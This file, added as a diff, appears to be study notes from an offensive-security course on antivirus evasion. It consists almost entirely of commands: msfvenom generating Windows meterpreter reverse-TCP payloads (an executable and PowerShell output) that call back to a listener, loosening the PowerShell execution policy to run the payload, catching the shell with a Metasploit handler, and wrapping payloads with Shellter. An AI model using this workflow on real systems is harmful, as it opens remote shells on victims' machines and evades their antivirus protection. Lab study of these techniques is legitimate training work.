@@ -1,0 +1,42 @@
+Methods of Detecting Malicious Code
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe
+
+
+
+
+AV Evasion: Practical Example
+C:\Users\offsec\Desktop> dir
+C:\Users\offsec\Desktop> binary.exe
+
+
+
+
+PowerShell In-Memory Injection
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
+C:\Users\offsec\Desktop> dir
+C:\Users\offsec\Desktop> powershell .\av_test.ps1
+C:\Users\offsec\Desktop> powershell
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+show options
+msf exploit(multi/handler) > exploit
+PS C:\Users\admin\Desktop> .\av_test.ps1
+meterpreter > getuid
+
+
+
+
+
+
+Shellter 
+kali@kali:~$ apt-cache search shellter
+kali@kali:~$ sudo apt install shellter
+kali@kali:~$ apt install wine
+msf exploit(multi/handler) > show options
+msf exploit(multi/handler) > exploit
+msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
+msf exploit(multi/handler) > exploit
+
+
+
